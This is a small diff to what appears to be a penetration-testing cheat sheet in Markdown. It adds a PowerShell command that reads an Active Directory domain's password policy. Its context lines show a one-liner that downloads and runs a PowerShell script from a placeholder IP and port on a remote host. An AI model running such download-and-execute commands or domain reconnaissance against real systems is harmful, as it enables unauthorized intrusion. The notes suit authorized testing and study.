@@ -413,3 +413,9 @@ On the remote host, execute the following PowerShell script:
 ```powershell
 IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/<script_name.ps1>')
 ```
+
+### Get Domain Password Policy
+
+```powershell
+$policy = Get-ADDefaultDomainPasswordPolicy -Credential $cred -Server $domain
+```
